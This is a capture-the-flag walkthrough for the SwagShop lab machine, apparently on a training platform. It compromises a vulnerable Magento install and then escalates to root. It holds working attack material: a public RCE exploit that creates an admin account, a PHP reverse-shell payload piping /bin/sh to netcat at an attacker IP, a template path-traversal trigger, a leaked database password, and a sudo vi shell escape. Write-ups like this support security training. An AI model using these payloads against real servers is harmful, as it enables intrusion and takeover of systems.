# SwagShop

> A medium-difficulty Linux machine focused on web application enumeration, Magento exploitation, gaining an initial shell, and Linux privilege escalation through a misconfigured `sudo` rule.

## Overview

| Category                 | Details                                  |
| ------------------------ | ---------------------------------------- |
| **Machine**              | SwagShop                                 |
| **Platform**             | Linux                                    |
| **Difficulty**           | Medium                                   |
| **Target IP**            | `10.129.229.138`                         |
| **Web Server**           | Apache 2.4.29                            |
| **Web Application**      | Magento                                  |
| **Magento Version**      | 1.9.0.0 / 1.9.0.1                        |
| **Initial Access**       | Magento exploitation                     |
| **Initial User**         | `www-data`                               |
| **Privilege Escalation** | Misconfigured `sudo` permission for `vi` |
| **Final Access**         | `root`                                   |

The attack path was:

```text
Port Enumeration
      ↓
Apache / Magento Discovery
      ↓
Virtual Host Configuration
      ↓
Magento Version Enumeration
      ↓
Magento Exploitation
      ↓
Web Shell / Reverse Shell
      ↓
www-data
      ↓
sudo -l
      ↓
vi Wildcard Misconfiguration
      ↓
Root Shell
```

---

# Enumeration

## Nmap Scan

We started with a basic Nmap scan against the target:

```bash
nmap 10.129.229.138
```

The scan revealed two open TCP ports:

```text
Nmap scan report for 10.129.229.138
Host is up, received reset ttl 63 (0.26s latency).
Scanned at 2026-09-04 21:55:26 EDT for 4s
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

The initial enumeration showed:

| Port | Service | Status |
| ---: | ------- | ------ |
| `22` | SSH     | Open   |
| `80` | HTTP    | Open   |

While the full port scan continued in the background, we proceeded with service and version detection.

---

## Service and Version Detection

```bash
nmap -sC -sV 10.129.229.138
```

The scan provided the following information:

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Services Identified

| Port | Service | Version / Information   |
| ---: | ------- | ----------------------- |
| `22` | SSH     | OpenSSH 7.6p1 Ubuntu    |
| `80` | HTTP    | Apache 2.4.29 on Ubuntu |

The HTTP service redirected to:

```text
http://swagshop.htb/
```

This indicated that the hostname needed to be configured locally.

---

## Hostname Configuration

We added the target hostname to `/etc/hosts`:

```text
10.129.229.138 swagshop.htb
```

After configuring the hostname, accessing `swagshop.htb` revealed an e-commerce website running **Magento**.

---

# Web Enumeration

## Directory and File Enumeration

We performed directory and file fuzzing against the web application.

Several interesting directories were discovered:

```text
/app
/skin
/js
/media
```

The presence of these directories was consistent with the Magento application identified on the target.

---

## Configuration File Enumeration

During further enumeration, we discovered configuration information containing credentials:

```text
<host>
<username>
<![CDATA[ root ]]>
</username>
<password>
<![CDATA[ fMVWh7bDHpgZkyfqQXreTjU9 ]]>
```

The discovered credentials were:

| Username | Password                   | Source                        |
| -------- | -------------------------- | ----------------------------- |
| `root`   | `fMVWh7bDHpgZkyfqQXreTjU9` | Discovered configuration data |

These credentials were noted for further testing during the assessment.

---

## Magento Version Enumeration

Manual enumeration of the Magento application was relatively slow, so we used **MageScan**.

The tool was obtained from:

```text
https://github.com/steverobbins/magescan
```

We ran:

```bash
php magescan.phar scan:all swagshop.htb
```

The scan identified:

```text
Magento Information

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
```

The application was running **Magento Community Edition 1.9.0.0 / 1.9.0.1**.

This provided a specific version to investigate for known vulnerabilities.

---

# Initial Foothold

## Magento Remote Code Execution

We searched for exploits affecting the identified Magento version.

An exploit from Exploit-DB was identified:

```text
https://www.exploit-db.com/exploits/37977
```

The exploit was identified as:

```text
Exploit: Magento eCommerce - Remote Code Execution
CVE: CVE-2015-1397
OSVDB: OSVDB-121260
```

We copied the exploit locally using SearchSploit:

```bash
searchsploit -m 37977
```

The output confirmed:

```text
Exploit: Magento eCommerce - Remote Code Execution
URL: https://www.exploit-db.com/exploits/37977
Path: /usr/share/exploitdb/exploits/xml/webapps/37977.py
Codes: CVE-2015-1397, OSVDB-121260
Verified: False
File Type: ASCII text
Copied to: /home/naval0505/37977.py
```

We executed the exploit:

```bash
python2 37977.py
```

The exploit returned:

```text
WORKED
Check http://swagshop.htb/admin with creds forme:forme
```

This provided access to the Magento administrative interface.

---

# Web Shell and Reverse Shell

After obtaining access to the Magento administrative panel, we proceeded toward code execution and a reverse shell.

A second Magento code-execution exploit was identified:

```text
https://www.exploit-db.com/exploits/37811
```

We also researched a Magento backdoor approach using:

```text
https://github.com/lavalamp-/LavaMagentoBD/tree/master
```

An alternative approach was also identified through research into Magento template exploitation.

---

## Enabling Template Symlinks

From the Magento administration interface, we navigated to:

```text
System → Configuration
```

Then:

```text
Advanced → Developers
```

Under:

```text
Template Settings
```

we changed:

```text
Allow Symlinks → Yes
```

---

## Creating the PHP Payload

We created a file named:

```text
shell.php.png
```

The file was constructed using:

```bash
echo '<?php' >> shell.php.png
```

Then the reverse shell command was added:

```bash
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.95 4444 >/tmp/f");' >> shell.php.png
```

Finally:

```bash
echo '?>' >> shell.php.png
```

---

## Uploading the Payload

The file was uploaded through the Magento administration interface.

We navigated to:

```text
Catalog → Manage Categories
```

The uploaded file was then accessible at:

```text
http://swagshop.htb/media/catalog/category/shell.php.png
```

---

## Triggering the Payload

We navigated to:

```text
Newsletter → Newsletter Templates
```

The following template was added:

```text
{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'
}}
```

The template was then previewed, triggering the uploaded PHP payload.

On the attacker machine, we started a Netcat listener:

```bash
nc -lvnp 4444
```

The listener received a connection:

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.229.138 36024
/bin/sh: 0: can't access tty; job control turned off
$
```

We confirmed the current user:

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The initial foothold was therefore obtained as:

```text
www-data
```

---

# User Access

The initial shell was a basic `/bin/sh` session, so we upgraded it to a more usable interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The shell became:

```text
www-data@swagshop:/var/www/html$
```

We then stabilized the terminal:

```bash
stty raw -echo
fg
```

And configured the shell environment:

```bash
export SHELL=bash
export TERM=xterm-256color
```

With the shell stabilized, we enumerated the home directories:

```bash
cd /home
```

The `haris` directory was present:

```bash
cd haris
ls
```

Output:

```text
user.txt
```

The user flag was then retrieved:

```bash
cat user.txt
```

The actual flag value was not included in the notes, so it is intentionally omitted here.

---

# Privilege Escalation

## Sudo Enumeration

With access as `www-data`, the next step was checking the available `sudo` permissions:

```bash
sudo -l
```

The result was:

```text
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

This was the key privilege escalation finding.

The `www-data` user could execute:

```text
/usr/bin/vi /var/www/html/*
```

as `root` without requiring a password.

The wildcard allowed `vi` to be invoked against files under:

```text
/var/www/html/
```

---

## Exploiting `vi`

Using the `vi` command's ability to execute shell commands, we launched `/bin/bash` from the privileged `vi` process.

The command used was:

```bash
sudo /usr/bin/vi /var/www/html/php.ini.sample -c ':!/bin/bash'
```

This resulted in a root shell:

```text
root@swagshop:/home/haris#
```

The privilege escalation was successful.

---

# Root Access

We now had root-level access:

```text
root@swagshop:/home/haris#
```

The root flag was located in:

```text
/root/root.txt
```

It was retrieved with:

```bash
cat /root/root.txt
```

The actual flag value was not included in the raw notes, so it is omitted from this writeup.

---

# Attack Path Summary

```text
Nmap Enumeration
        ↓
SSH + HTTP Discovered
        ↓
swagshop.htb Identified
        ↓
Magento Application Discovered
        ↓
Magento Version Enumeration
        ↓
Magento RCE Exploit
        ↓
Magento Admin Access
        ↓
PHP Payload Uploaded
        ↓
Reverse Shell
        ↓
www-data
        ↓
user.txt
        ↓
sudo -l
        ↓
vi Allowed as root with Wildcard
        ↓
Shell Execution Through vi
        ↓
root
        ↓
root.txt
```

---

# Key Takeaways

1. **Service enumeration provides the initial direction.** Identifying HTTP and the redirected hostname led to further web application investigation.

2. **Version enumeration is valuable against legacy applications.** Determining the Magento version made it possible to research relevant public exploits.

3. **Web application administration panels can become an attack surface.** Administrative functionality provided a route toward code execution.

4. **Shell stabilization matters during post-exploitation.** Converting the basic Netcat shell into a PTY made subsequent enumeration significantly easier.

5. **Always check `sudo -l` after obtaining Linux access.** The sudo configuration immediately revealed a potentially powerful privilege escalation path.

6. **Wildcard permissions can introduce serious security risks.** Allowing `vi` to execute as root against files matching `/var/www/html/*` provided a route to arbitrary command execution with root privileges.

---

# Tools Used

* **Nmap** — Port and service enumeration
* **Browser** — Web application enumeration
* **Directory/File Fuzzing** — Web content discovery
* **MageScan** — Magento version and application enumeration
* **SearchSploit** — Exploit discovery
* **Python** — Exploit execution and shell stabilization
* **Netcat** — Reverse shell listener
* **Metasploit was not used** in this machine

---

# Conclusion

SwagShop demonstrated a practical Linux penetration-testing workflow centered around a vulnerable Magento installation.

The machine began with basic network and web enumeration, followed by Magento version identification and exploitation to obtain a shell as `www-data`. From there, standard Linux privilege enumeration revealed a misconfigured `sudo` rule that allowed `vi` to be executed as root, ultimately providing full system access.

The main lesson from this machine is the value of **methodical enumeration**. Identifying the web technology, determining its version, researching the relevant attack surface, and finally checking local privilege configurations provided a clear path from an externally exposed web service to root access.
